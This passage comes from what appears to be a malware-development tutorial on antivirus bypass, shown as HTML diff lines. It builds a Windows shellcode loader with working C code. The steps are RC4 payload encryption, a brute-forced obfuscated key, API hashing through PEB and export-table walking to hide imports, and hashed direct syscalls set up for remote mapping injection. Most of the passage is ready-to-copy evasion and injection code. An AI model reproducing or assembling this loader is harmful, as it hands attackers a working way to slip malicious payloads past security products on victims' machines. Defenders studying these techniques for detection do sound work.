+            <img src="../../assets_img/av-bypass-616804411-39794aab-14d5-439c-9f30-2ed26efe8dce.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="payload-encryption" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Payload Encryption</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellShell.exe</code> will be used for payload encryption. The command that will be used is <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">.\HellShell.exe calc.bin rc4</code>, where <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">calc.bin</code> is the raw payload file. The encrypted payload will replace the previous unencrypted payload in the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">main.c</code> file. Furthermore, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Rc4EncryptionViSystemFunc032</code> function which is responsible for decryption will be saved in the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Inject.c</code> file.</p><h3 id="brute-force-decryption" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Brute Force Decryption</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellShell.exe</code> generates the key below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">unsigned char Rc4Key[] = {
+        0x61, 0x1A, 0xA0, 0xAA, 0xA7, 0x92, 0x9F, 0xBA, 0x8F, 0xCE, 0x4C, 0xD8, 0x11, 0xFA, 0xED, 0xB9 };</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The key will be encrypted and then decrypted using the brute force method. First, the key needs to be encrypted. This will be done via a new project that will use the same algorithm as the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">KeyGuard.exe</code> tool. The only difference is that the key is not randomly generated since <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellShell.exe</code> already generated one(<code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Rc4Key</code>). This new project is shared in this module&#x27;s code and is named <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">KeyGuard2</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-716812124-de717043-aa23-40c9-8058-f0ae0c06f407.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Rc4EncryptionViSystemFunc032</code> function will be updated to include the brute forcing logic. The function will be called by <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">RemoteMappingInjectionViaSyscalls</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+
+	// The return of SystemFunction032
+	NTSTATUS        	STATUS				= NULL;
+	BYTE			RealKey	[KEY_SIZE]	= { 0 };
+	int			    b				    = 0;
+
+	// Brute forcing the key:
+	while (1) {
+		// Using the hint byte, if this is equal, then we found the &#x27;b&#x27; value needed to decrypt the key
+		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
+			break;
+		// Else, increment &#x27;b&#x27; and try again
+		else
+			b++;
+	}
+
+	printf(&quot;[i] Calculated &#x27;b&#x27; to be : 0x%0.2X \n&quot;, b);
+
+	// Decrypting the key
+	for (int i = 0; i &lt; KEY_SIZE; i++) {
+		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
+	}
+
+	// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
+	USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
+			        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };
+
+
+	// Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
+	// And using its return as the hModule parameter in GetProcAddress
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);
+
+	// If SystemFunction032 calls failed it will return non zero value
+	if ((STATUS = SystemFunction032(&amp;Img, &amp;Key)) != 0x0) {
+		printf(&quot;[!] SystemFunction032 FAILED With Error : 0x%0.8X\n&quot;, STATUS);
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="brute-force-decryption-results" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Brute Force Decryption Results</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Executing the payload (Anti analysis features are disabled).</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-816812885-3a8e28cd-22cb-42f0-9673-9d58ea2471da.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="api-hashing" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>API Hashing</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So far, all the WinAPIs used have been called directly, which means they can be found in the IAT of the implementation. To resolve this, a new file, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ApiHashing.c</code>, is created which contains the necessary functions for implementing API hashing.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>ApiHashing.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#include &lt;Windows.h&gt;#include &quot;Structs.h&quot;#include &quot;Common.h&quot;
+
+FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
+
+	if (hModule == NULL || dwApiNameHash == NULL)
+		return NULL;
+
+	PBYTE pBase = (PBYTE)hModule;
+
+	PIMAGE_DOS_HEADER       pImgDosHdr       = (PIMAGE_DOS_HEADER)pBase;
+	if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
+		return NULL;
+
+	PIMAGE_NT_HEADERS       pImgNtHdrs       = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
+	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
+		return NULL;
+
+	IMAGE_OPTIONAL_HEADER   ImgOptHdr        = pImgNtHdrs-&gt;OptionalHeader;
+	PIMAGE_EXPORT_DIRECTORY pImgExportDir    = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+	PDWORD			FunctionNameArray       = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);
+	PDWORD			FunctionAddressArray    = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);
+	PWORD			FunctionOrdinalArray    = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);
+
+	for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
+		CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
+		PVOID	pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
+
+		// Hashing every function name `pFunctionName`
+		// If both hashes are equal, then we found the function we want
+		if (dwApiNameHash == HASHA(pFunctionName)) {
+			return pFunctionAddress;
+		}
+	}
+
+	return NULL;
+}
+
+HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {
+
+	if (dwModuleNameHash == NULL)
+		return NULL;
+
+#ifdef _WIN64
+	PPEB			pPeb = (PEB*)(__readgsqword(0x60));
+#elif _WIN32
+	PPEB			pPeb = (PEB*)(__readfsdword(0x30));
+#endif
+
+	PPEB_LDR_DATA		    pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
+	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);
+
+	while (pDte) {
+
+		if (pDte-&gt;FullDllName.Length != NULL &amp;&amp; pDte-&gt;FullDllName.Length &lt; MAX_PATH) {
+
+			// Converting `FullDllName.Buffer` to upper case string
+			CHAR UpperCaseDllName[MAX_PATH];
+
+			DWORD i = 0;
+			while (pDte-&gt;FullDllName.Buffer[i]) {
+				UpperCaseDllName[i] = (CHAR)toupper(pDte-&gt;FullDllName.Buffer[i]);
+				i++;
+			}
+			UpperCaseDllName[i] = &#x27;\0&#x27;;
+
+			// Hashing `UpperCaseDllName` and comparing the hash value to that&#x27;s of the input `dwModuleNameHash`
+			if (HASHA(UpperCaseDllName) == dwModuleNameHash)
+				return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
+
+		}
+		else {
+			break;
+		}
+
+		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
+	}
+
+	return NULL;
+}</code></pre>
+        </div><h3 id="header-file" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Header File</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Before continuing, a new header file, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">typedef.h</code>, should be created to define the used WinAPIs as function pointers for clarity and maintainability. <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Common.h</code> will need to include the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">typedef.h</code> header file using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">#include &quot;typedef.h&quot;</code>.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>typedef.h</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#pragma once#include &lt;Windows.h&gt;typedef ULONGLONG(WINAPI* fnGetTickCount64)();
+
+typedef HANDLE(WINAPI* fnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
+
+typedef LRESULT(WINAPI* fnCallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
+
+typedef HHOOK(WINAPI* fnSetWindowsHookExW)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);
+
+typedef BOOL(WINAPI* fnGetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
+
+typedef LRESULT(WINAPI* fnDefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
+
+typedef BOOL(WINAPI* fnUnhookWindowsHookEx)(HHOOK hhk);
+
+typedef DWORD(WINAPI* fnGetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
+
+typedef HANDLE(WINAPI* fnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+
+typedef BOOL(WINAPI* fnSetFileInformationByHandle)(HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);
+
+typedef BOOL(WINAPI* fnCloseHandle)(HANDLE hObject);</code></pre>
+        </div><h3 id="api-hashing-structure" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>API_HASHING Structure</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Next, a new structure <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">API_HASHING</code> is defined in <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Common.h</code> and is used to store the addresses of WinAPIs used, making them more accessible for use within the implementation&#x27;s functions.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Common.h</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _API_HASHING {
+
+	fnGetTickCount64                pGetTickCount64;
+	fnOpenProcess                   pOpenProcess;
+	fnCallNextHookEx                pCallNextHookEx;
+	fnSetWindowsHookExW             pSetWindowsHookExW;
+	fnGetMessageW                   pGetMessageW;
+	fnDefWindowProcW                pDefWindowProcW;
+	fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
+	fnGetModuleFileNameW            pGetModuleFileNameW;
+	fnCreateFileW                   pCreateFileW;
+	fnSetFileInformationByHandle    pSetFileInformationByHandle;
+	fnCloseHandle                   pCloseHandle;
+
+}API_HASHING, * PAPI_HASHING;</code></pre>
+        </div><h3 id="updating-vx-table" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating VX_Table</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetModuleHandleH</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetProcAddressH</code> functions must be used to initialize the elements in the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">API_HASHING</code> structure. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitializeSyscalls</code> function then uses these functions to initialize the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VX_TABLE</code> structure, which is used to call syscalls.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">// ...
+
+API_HASHING g_Api = {0};
+
+
+BOOL InitializeSyscalls() {
+
+	// Get the PEB
+	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
+	PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
+	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
+		return FALSE;
+
+	// Get NTDLL module
+	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);
+
+	// Get the EAT of NTDLL
+	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
+	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
+		return FALSE;
+
+	g_Sys.NtCreateSection.uHash          = NtCreateSection_JOAA;
+	g_Sys.NtMapViewOfSection.uHash       = NtMapViewOfSection_JOAA;
+	g_Sys.NtUnmapViewOfSection.uHash     = NtUnmapViewOfSection_JOAA;
+	g_Sys.NtClose.uHash                  = NtClose_JOAA;
+	g_Sys.NtCreateThreadEx.uHash         = NtCreateThreadEx_JOAA;
+	g_Sys.NtWaitForSingleObject.uHash    = NtWaitForSingleObject_JOAA;
+	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
+	g_Sys.NtDelayExecution.uHash         = NtDelayExecution_JOAA;
+
+	// Initialize the syscalls
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtQuerySystemInformation))
+		return FALSE;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtDelayExecution))
+		return FALSE;
+
+
+	//	User32.dll exported
+	g_Api.pCallNextHookEx      = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
+	g_Api.pDefWindowProcW      = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
+	g_Api.pGetMessageW         = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
+	g_Api.pSetWindowsHookExW   = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
